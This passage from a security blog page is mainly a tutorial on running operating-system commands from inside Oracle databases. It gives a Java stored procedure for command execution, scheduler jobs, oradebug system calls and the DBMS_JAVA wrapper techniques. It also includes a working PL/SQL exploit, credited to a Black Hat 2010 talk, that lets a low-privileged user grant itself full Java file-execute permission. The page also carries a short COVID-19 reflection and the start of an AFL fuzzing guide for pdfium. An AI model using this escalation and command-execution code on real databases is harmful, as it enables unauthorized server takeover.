+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="string">"JAVACMD"</span> AS</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JAVACMD</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">execCommand</span> <span class="params">(String command)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] finalCommand;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">"C:\\windows\\system32\\cmd.exe"</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">"/y"</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = <span class="string">"/c"</span>;</span><br><span class="line">            finalCommand[<span class="number">3</span>] = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = command;</span><br><span class="line">        &#125;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(finalCommand);</span><br><span class="line">        <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">               System.err.println(<span class="string">"command execute failed."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">            System.out.println(lineStr);</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="function">CREATE OR REPLACE PROCEDURE <span class="title">JAVACMDPROC</span> <span class="params">(p_command IN VARCHAR2)</span></span></span><br><span class="line"><span class="function">AS LANGUAGE JAVA</span></span><br><span class="line"><span class="function">NAME 'JAVACMD.<span class="title">execCommand</span> <span class="params">(java.lang.String)</span>'</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> serveroutput <span class="keyword">on</span> <span class="keyword">size</span> <span class="number">100000</span>;</span><br><span class="line">exec dbms_java.set_output(100000);</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p>
+<ul>
+<li>用户权限</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>JAVA 权限</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dba_java_policy;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_java_policy;</span><br></pre></td></tr></table></figure>
+
+<p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');</span><br><span class="line">exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');</span><br><span class="line">exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; exec javacmdproc('/bin/uname -a');</span><br><span class="line">Linux localhost.localdomain 2.6.32-100.34.1.el6uek.i686 <span class="comment">#1 SMP Wed May 25</span></span><br><span class="line">17:28:36 EDT 2011 i686 i686 i386 GNU/Linux</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p>
+<h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p>
+<h4 id="1-2-2-需要的权限"><a href="#1-2-2-需要的权限" class="headerlink" title="1.2.2 需要的权限"></a>1.2.2 需要的权限</h4><ol>
+<li>CREATE JOB</li>
+<li>CREATE EXTERNAL JOB</li>
+<li>EXECUTE on dbms_scheduler (granted to public by default)</li>
+</ol>
+<p><code>grant create job, create external job to scott ;</code></p>
+<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; <span class="string">'MyCmd'</span>,</span><br><span class="line">program_type=&gt; <span class="string">'EXECUTABLE'</span>,</span><br><span class="line">-- Use the ampersand to <span class="keyword">break</span> out</span><br><span class="line">program_action =&gt; <span class="string">'/tmp/a.sh'</span>,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; <span class="string">'Run a command using shell metacharacters.'</span></span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; <span class="string">'X'</span>,</span><br><span class="line">   program_name=&gt; <span class="string">'MyCmd'</span>,</span><br><span class="line">   repeat_interval=&gt; <span class="string">'FREQ=SECONDLY;INTERVAL=10'</span>,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; <span class="string">'Every 10 seconds'</span>);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="string">'X'</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol>
+<li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li>
+<li>Windows系统必须开启OracleJobSchedulerSID 服务</li>
+<li>Linux系统上相关文件的权限必须正确</li>
+<li>高版本的Linux，执行的group已经被Oracle将为nobody</li>
+</ol>
+<p>总之这个方法局限行很大，不推荐使用，列在这里只是做一个备忘。</p>
+<h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul>
+<li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; oradebug help</span><br><span class="line">HELP           [command]                 Describe one or all commands</span><br><span class="line">SETMYPID                                 Debug current process</span><br><span class="line">SETOSPID       &lt;ospid&gt;                   Set OS pid of process to debug</span><br><span class="line">SETORAPID      &lt;orapid&gt; [&#39;force&#39;]        Set Oracle pid of process to debug</span><br><span class="line">SETORAPNAME    &lt;orapname&gt;                Set Oracle process name to debug</span><br><span class="line">SHORT_STACK                              Get abridged OS stack</span><br><span class="line">CURRENT_SQL                              Get current SQL</span><br><span class="line">DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump</span><br><span class="line">DUMPSGA        [bytes]                   Dump fixed SGA</span><br><span class="line">DUMPLIST                                 Print a list of available dumps</span><br><span class="line">EVENT          &lt;text&gt;                    Set trace event in process</span><br><span class="line">SESSION_EVENT  &lt;text&gt;                    Set trace event in session</span><br><span class="line">DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print&#x2F;dump a fixed PGA&#x2F;SGA&#x2F;UGA variable</span><br><span class="line">DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print&#x2F;dump an address with type info</span><br><span class="line">SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA&#x2F;SGA&#x2F;UGA variable</span><br><span class="line">PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print&#x2F;Dump memory</span><br><span class="line">POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory</span><br><span class="line">WAKEUP         &lt;orapid&gt;                  Wake up Oracle process</span><br><span class="line">SUSPEND                                  Suspend execution</span><br><span class="line">RESUME                                   Resume execution</span><br><span class="line">FLUSH                                    Flush pending writes to trace file</span><br><span class="line">CLOSE_TRACE                              Close trace file</span><br><span class="line">TRACEFILE_NAME                           Get name of trace file</span><br><span class="line">LKDEBUG                                  Invoke global enqueue service debugger</span><br><span class="line">NSDBX                                    Invoke CGS name-service debugger</span><br><span class="line">-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command prefix</span><br><span class="line">-R             &lt;Inst-List | def | all&gt;   Parallel oradebug prefix (return output</span><br><span class="line">SETINST        &lt;instance# .. | all&gt;      Set instance list in double quotes</span><br><span class="line">SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA to file; dirname in double quotes</span><br><span class="line">DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname in double quotes</span><br><span class="line">MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname in double quotes</span><br><span class="line">HANGANALYZE    [level] [syslevel]        Analyze system hang</span><br><span class="line">FFBEGIN                                  Flash Freeze the Instance</span><br><span class="line">FFDEREGISTER                             FF deregister instance from cluster</span><br><span class="line">FFTERMINST                               Call exit and terminate instance</span><br><span class="line">FFRESUMEINST                             Resume the flash frozen instance</span><br><span class="line">FFSTATUS                                 Flash freeze status of instance</span><br><span class="line">SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs to names</span><br><span class="line">WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory</span><br><span class="line">DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint</span><br><span class="line">SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints</span><br><span class="line">DIRECT_ACCESS  &lt;set&#x2F;enable&#x2F;disable command | select query&gt; Fixed table access</span><br><span class="line">CORE                                     Dump core without crashing process</span><br><span class="line">IPC                                      Dump ipc information</span><br><span class="line">UNLIMIT                                  Unlimit the size of the trace file</span><br><span class="line">PROCSTAT                                 Dump process statistics</span><br><span class="line">CALL           [-t count] &lt;func&gt; [arg1]...[argn]  Invoke function with arguments</span><br></pre></td></tr></table></figure>
+
+<p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p>
+<h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid;
+oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
+<li>这里权限要求是SYSDBA</li>
+<li>双引号里必须是使用TAB而不能使用空格</li>
+<li>Linux 和 Windows 下的ORACLE都能利用成功</li>
+</ol>
+<h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="string">'java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,'</span>ENABLED’ from dual;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p>
+<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">'oracle/aurora/util/Wrapper'</span>,<span class="string">'main'</span>,<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'/bin/ls&gt;/tmp/OUT2.LST'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p>
+<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">'oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST'</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="http://www.orafaq.com/scripts/plsql/oscmd.txt" target="_blank" rel="noopener">Using Java to run os command</a></li>
+<li><a href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/scheduse002.htm#CHDIDGAE" target="_blank" rel="noopener">DBMS_SCHEDULER</a></li>
+<li><a href="http://www.juliandyke.com/Diagnostics/Tools/ORADEBUG/ORADEBUG.html" target="_blank" rel="noopener">oradebug</a></li>
+<li><a href="">BlackHat-DC-2010-Litchfield-Oracle11g</a></li>
+<li><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf" target="_blank" rel="noopener">Hacking Oracle from the Web</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/other/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/other/" class="post-title-link" itemprop="url">一些杂谈</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。</p>
+<p>在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？</p>
+<p>我看到一个建议轻征不隔离，把资源让给重症者。</p>
+<p>大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。</p>
+<p>这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！</p>
+<p>最后希望所有看到此文的，新年幸福安康！</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/pdfium-fuzz.public/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/pdfium-fuzz.public/" class="post-title-link" itemprop="url">使用 afl-fuzz fuzz pdfium</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>先在 <a href="https://pdfium.googlesource.com/pdfium/" target="_blank" rel="noopener">https://pdfium.googlesource.com/pdfium/</a> 下载源码.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir repo</span><br><span class="line"><span class="built_in">cd</span> repo</span><br><span class="line">gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git</span><br><span class="line">gclient sync</span><br><span class="line"><span class="built_in">cd</span> pdfium</span><br></pre></td></tr></table></figure>
+
+<p>gclient 命令在 depot_tools 中, 需要安装 参考下面的文章</p>
+<p><a href="http://www.chromium.org/developers/how-tos/install-depot-tools" target="_blank" rel="noopener">http://www.chromium.org/developers/how-tos/install-depot-tools</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure>
+
+<p>主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。</p>
+<p><code>https_proxy=http://localhost:8118 gclient sync</code> 下载 download google storage过<br>程中还会遇到一个网络问题，需要编写配置文件 ~/.boto</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Boto]</span><br><span class="line">proxy &#x3D; 127.0.0.1  # 不带 http:&#x2F;&#x2F;</span><br><span class="line">proxy_port&#x3D; 8118</span><br></pre></td></tr></table></figure>
+
+<p><code>export NO_AUTH_BOTO_CONFIG=~/.boto</code></p>
+<p>源码包非常大，大概有1G多，需要耐心等待。</p>
+<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译需要使用 ubuntu 或者 Debian 系统，其他系统的依赖问题解决起来比较麻烦，<br>如果是上面两种操作系统的话，有脚本自动安装依赖。</p>
+<p><code>./build/install-build-deps.sh</code></p>
+<p>安装完所以依赖后就可以开始编译了，首先要先生成 gn 文件 (2016 年google 放弃使用原来的 gyp 编译方式)</p>
+<p><code>gn args out/afl</code> 会调用vim 编译器， 输入下面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Build arguments go here.</span><br><span class="line"># See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span><br><span class="line">use_goma &#x3D; false # Googlers only. Make sure goma is installed and running first.</span><br><span class="line">is_debug &#x3D; false  # Enable debugging features.</span><br><span class="line"></span><br><span class="line">pdf_use_skia &#x3D; true # Set true to enable experimental skia backend.</span><br><span class="line">pdf_use_skia_paths &#x3D; false  # Set true to enable experimental skia backend (paths only).</span><br><span class="line"></span><br><span class="line">pdf_enable_xfa &#x3D; true  # Set false to remove XFA support (implies JS support).</span><br><span class="line">pdf_enable_v8 &#x3D; true  # Set false to remove Javascript support.</span><br><span class="line">pdf_is_standalone &#x3D; true  # Set for a non-embedded build.</span><br><span class="line">is_component_build &#x3D; false # Disable component build (must be false)</span><br><span class="line">v8_static_library &#x3D; true</span><br><span class="line"></span><br><span class="line">clang_use_chrome_plugins &#x3D; false  # Currently must be false.</span><br><span class="line">use_sysroot &#x3D; false  # Currently must be false on Linux, but entirely omitted on windows.</span><br><span class="line"></span><br><span class="line">use_afl &#x3D; true</span><br><span class="line">#is_asan &#x3D; true</span><br><span class="line">enable_nacl &#x3D; true</span><br><span class="line">optimize_for_fuzzing &#x3D; true</span><br><span class="line">symbol_level&#x3D;1</span><br></pre></td></tr></table></figure>
+
